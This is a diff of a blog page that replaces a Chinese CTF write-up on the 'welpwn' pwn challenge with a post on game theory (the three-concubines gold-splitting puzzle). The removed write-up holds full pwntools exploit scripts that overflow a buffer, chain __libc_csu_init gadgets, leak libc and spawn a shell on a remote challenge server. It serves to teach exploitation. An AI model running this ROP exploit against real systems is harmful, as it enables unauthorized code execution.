@@ -4,9 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="深入探究64位rop链构造，wp中常见的万能gadgets详解_ 攻防世界pwn进阶区welpwn, All fine">
-    <meta name="description" content="前言这一题做的时间跨度比较长了，断断续续做了一天多，然后尝试了两种方式，一种是DynELF泄露system地址，还有一种是利用python的LibcSearcher模块得到libc偏移再进一步获取system的libc地址。
-思路分析0x0">
+    <meta name="keywords" content="博弈论 | 三姬分金与囚徒困境, All fine">
+    <meta name="description" content="前言昨天在刷李永乐老师视频的时候看到了一个“三姬分金”的问题，然后引到了博弈论。说实话，从这个老师的课程中深深的感受到了知识的魅力。就想着写一个专栏，学习一下博弈论的有关知识。
+什么是博弈
+
+通俗地讲， 博弈就是指游戏中的一种选择策略的研究">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>深入探究64位rop链构造，wp中常见的万能gadgets详解_ 攻防世界pwn进阶区welpwn | Kni9hT&#39;s Blog</title>
+    <title>博弈论 | 三姬分金与囚徒困境 | Kni9hT&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -306,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">深入探究64位rop链构造，wp中常见的万能gadgets详解_ 攻防世界pwn进阶区welpwn</h1>
+                    <h1 class="description center-align post-title">博弈论 | 三姬分金与囚徒困境</h1>
                 </div>
             </div>
         </div>
@@ -428,8 +430,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/rop/">
-                                <span class="chip bg-color">rop</span>
+                            <a href="/tags/%E4%B8%89%E5%A7%AC%E5%88%86%E9%87%91/">
+                                <span class="chip bg-color">三姬分金</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83/">
+                                <span class="chip bg-color">囚徒困境</span>
                             </a>
                         
                     </div>
@@ -440,8 +446,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/pwn/" class="post-category">
-                                pwn
+                            <a href="/categories/%E5%8D%9A%E5%BC%88%E8%AE%BA/" class="post-category">
+                                博弈论
                             </a>
                         
                     </div>
@@ -453,7 +459,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-21
+                    2020-04-11
                 </div>
                 
 
@@ -462,14 +468,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    2.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    10 分
                 </div>
                 
 				
@@ -480,122 +486,95 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一题做的时间跨度比较长了，断断续续做了一天多，然后尝试了两种方式，一种是DynELF泄露system地址，还有一种是利用python的LibcSearcher模块得到libc偏移再进一步获取system的libc地址。</p>
-<h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="0x00-检查保护机制"><a href="#0x00-检查保护机制" class="headerlink" title="0x00.检查保护机制"></a>0x00.检查保护机制</h3><p><img src="https://img-blog.csdnimg.cn/20200320190823909.jpg" alt=""><br><strong>感觉是栈溢出然后构造ROP来getshell。</strong></p>
-<h3 id="0x01-找到溢出点"><a href="#0x01-找到溢出点" class="headerlink" title="0x01.找到溢出点"></a>0x01.找到溢出点</h3><p><img src="https://img-blog.csdnimg.cn/20200320191121171.jpg" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191156122.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>read函数是不能溢出的，进echo函数查看，发现echo函数开辟的大小只有0x20，<strong>但是buf可以写入的有0x400字节，buf复制到echo，显然可以发生溢出。</strong><br><strong>利用cyclic计算得出溢出需要24字节。</strong></p>
-<h3 id="0x02-跳过echo在buf上构造rop"><a href="#0x02-跳过echo在buf上构造rop" class="headerlink" title="0x02.跳过echo在buf上构造rop"></a>0x02.跳过echo在buf上构造rop</h3><p>我们可以发现在echo函数内部，有一个循环判断，a1[i]!=’\x00’，否则会发生截断。但是构造rop需要传递地址，一般都会有’\x00’存在，故不能直接构造rop。<br><img src="https://img-blog.csdnimg.cn/20200320191852756.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191908900.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p>
-<pre><code>ida查看echo函数的结束地址之后就是read(&amp;buf)的地址。
-又因为echo开辟的空间是0x20，故echo开始处跳0x20个字节即能到buf处。
-buf上有0x400大小可以布置ROP。
-一次rop是8字节，找一个gadget执行四次pop即可。</code></pre><h3 id="0x03-选择合适的gadgets"><a href="#0x03-选择合适的gadgets" class="headerlink" title="0x03.选择合适的gadgets"></a>0x03.选择合适的gadgets</h3><p><img src="https://img-blog.csdnimg.cn/2020032019213157.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p>
-<pre class="line-numbers language-yaml"><code class="language-yaml">pop4_addr=0x40089c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="0x04-万能的通用gadgets"><a href="#0x04-万能的通用gadgets" class="headerlink" title="0x04.万能的通用gadgets"></a>0x04.万能的通用gadgets</h3><blockquote>
-<p>剩下的ROP链可以用通用gadgets来实现。<br>这里涉及到X64下面的一些万能gadgets，原因在于__libc_csu_init()函数。<br>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在刷李永乐老师视频的时候看到了一个“三姬分金”的问题，然后引到了博弈论。说实话，从这个老师的课程中深深的感受到了知识的魅力。就想着写一个专栏，学习一下博弈论的有关知识。</p>
+<p><strong>什么是博弈</strong></p>
+<blockquote>
+<p>通俗地讲， 博弈就是指游戏中的一种选择策略的研究。 博弈的英文为“game”， 我们一般将它翻译成“游戏”。 而在英语中， “game”的意义不同于汉语中的游戏， 它是人们遵循一定规则的活动， 进行活动的人的目的是让自己“赢”。 我们在和对手竞赛或游戏的时候怎样使自己赢呢？ 这不但要考虑自己的策略， 还要考虑其他人的选择。 生活中博弈的案例很多， 只要涉及人群的互动以及选择决策， 就有博弈。<br>一个人做选择时必须考虑其他人的选择或是事务的变化， 而其他人做选择时也会考虑此人的选择。 此人的结果——博弈论称之为支付， 不仅取决于他的行动选择——博弈论称之为策略选择， 同时取决于其他人的策略选择。 这样， 此人和其他人或事务就构成一个博弈。</p>
 </blockquote>
-<p><strong>汇编代码如下：</strong></p>
-<pre><code>  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx
-  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp
-  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12
-  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13
-  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14
-  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15</code></pre><pre><code>  4005f0:   4c 89 fa                mov    %r15,%rdx
-  4005f3:   4c 89 f6                mov    %r14,%rsi
-  4005f6:   44 89 ef                mov    %r13d,%edi
-  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)</code></pre><blockquote>
-<p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200411201405346.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="博弈"></p>
+<h2 id="三姬分金问题"><a href="#三姬分金问题" class="headerlink" title="三姬分金问题"></a>三姬分金问题</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><blockquote>
+<p>当年，韩非子到一个大将军处索要军饷，看见大将军的三个妃子在玩分金币的游戏。于是韩非子提议，玩点更刺激的。</p>
 </blockquote>
-<p><strong>call system(“/bin/sh”)</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!bash</span>
-<span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span>
-<span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>
-payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
-payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>
-payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>
-payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
-payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>参考blog：</strong><a href="http://www.vuln.cn/6644" target="_blank" rel="noopener">蒸米-一步一步学ROP之x64</a><br><strong>实例运用：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104906434" target="_blank" rel="noopener">64位程序rop链构造</a></p>
-<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="使用DynELF"><a href="#使用DynELF" class="headerlink" title="使用DynELF"></a>使用DynELF</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.- coding=UTF-8 -.-</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
-r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>
-elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>
-pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span> <span class="token comment" spellcheck="true">#跳过echo</span>
-pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15;ret;</span>
-rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span> <span class="token comment" spellcheck="true">#mov rdx,r15;mov rdi,r14;mov edi,r13;</span>
-start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>
-write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
-bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
-read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
-pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>
-<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#先接收一次</span>
-    payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true">#junk</span>
-    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
-    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过write函数泄露 pop r14,r15;</span>
-    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#write(1,address,8)</span>
-    payload <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#start调整栈帧</span>
-    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#回到main函数</span>
-    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-    data <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
-    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%# x => %s "</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> data
-
-dyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#写入/bin/sh</span>
-payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span>
-payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
-payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#read(0,bss_addr,8)</span>
-payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> 
-payload1 <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 执行system<span class="token punctuation">(</span><span class="token string">'bss_addr'</span><span class="token punctuation">)</span>
-payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把'/bin/sh'写到bss_addr</span>
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="使用LibcSearcher"><a href="#使用LibcSearcher" class="headerlink" title="使用LibcSearcher"></a>使用LibcSearcher</h3><p><strong>使用write_addr-libc.dump(‘write’)计算出libc_off地址<br>再由libc_off+libc.dump(‘system’)计算出system_addr</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.-coding=UTF-8 -.-</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
-r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>
-pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span>
-pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span>
-rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span>
-start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>
-write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
-puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-<span class="token comment" spellcheck="true">#bss_addr = elf.bss()</span>
-read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
-pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>
-main_addr <span class="token operator">=</span> <span class="token number">0x4007CD</span>
-
-r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#计算libc_off</span>
-payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>
-payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#通过write函数来泄露write_addr</span>
-payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用start函数调整栈帧</span>
-payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info <span class="token punctuation">(</span><span class="token string">"write_addr => %#x"</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>
-
-<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
-libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>
-libc_off<span class="token operator">=</span>write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算libc的偏移</span>
-sys_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算system地址</span>
-binsh_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算'/bin/sh'地址</span>
-
-payload1 <span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
-payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>
-payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>注意：<br>使用LibcSearcher方式，python要安装了相对应模块，还需要下载对应的libc版本。<strong>我第二种方法只是给了一个模板，未使用此方法getshell。</strong><br><strong>参考博客：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104996280" target="_blank" rel="noopener">Ubuntu下LibcSearcher的安装和使用方法</a></p>
+<h3 id="游戏规则"><a href="#游戏规则" class="headerlink" title="游戏规则"></a>游戏规则</h3><blockquote>
+<p>现有A、B、C三名美姬，分100枚金币。从A开始，每个人依次提议分配方案。如果提议赞同人数不超过50%，则提议人被处死。反之则提议通过。A、B、C的顺序通过抽签来决定。<br>此外，有两点前提：<br>1.每个人都是聪明的，即她知道每个提议带来的后果，并追求自己利益的最大化。<br>2.每个人都是邪恶的，在她追求自己利益最大化的同时，要尽量多的杀死其余美姬。</p>
+</blockquote>
+<h3 id="思维实验0"><a href="#思维实验0" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>如果游戏按照规则进行，那么结果会是怎样？<br>（1）我们不妨先假设A的提议被B、C否决：<br>美姬A被处死，到美姬B提议，根据规则”赞同人数不超过50%则提议人被处死”，故无论美姬B提议什么，美姬C都不会同意（即使B提议金币全给C也是如此）。美姬B这么聪明当然也考虑到了这个问题。<br>（2）美姬A提议必然通过：<br>由（1）中分析，美姬A的提议必然会被B同意（B不同意就死），所以A可以肆无忌惮的提议分配方案，故A提出了（100,0,0）的分配方案，实现了自己利益最大化。</p>
+<p><strong>在思维实验0中，美姬A具有先手优势。</strong></p>
+<hr>
+<h3 id="思维实验1"><a href="#思维实验1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p>假设在美姬A前面加一个美姬X，其他规则不变，结果会如何？<br>（1）不妨先假设美姬X的提议被否决：<br>美姬X被处死，到美姬A提议，参考思维实验0可知，美姬A还是提出（100,0,0）的提议，且必定被通过。<br>（2）美姬X提出方案对B，C有利则会被通过：<br>美姬X考虑到如果由美姬A提议，则B,C什么都得不到。故美姬X决定拉拢美姬B,C。她提出了（98,0，1,1）的分配方案。美姬A肯定不同意（但是没有用），美姬B,C一看还能得到1枚金币，于是通过了美姬X的提议方案。<br><strong>在思维实验1中，美姬X具有先手优势，即领导群体，美姬B、C属于基层群体，是领导群体拉拢的对象。在有限次的实验中，拿到先手权意味着锁定胜局。而且只要条件规则稳定，结果是一定的，这样的局面叫做纳什均衡</strong></p>
+<hr>
+<h3 id="思维实验2"><a href="#思维实验2" class="headerlink" title="思维实验2"></a>思维实验2</h3><p><strong>共谋</strong></p>
+<blockquote>
+<p>在思维实验1的背景下，美姬A,B,C觉得不公平，还想实现利益最大化。于是A提议：否定美姬X的提议，A,B,C各分33枚金币，剩下一枚丢进海里。这个过程叫做”共谋”。</p>
+</blockquote>
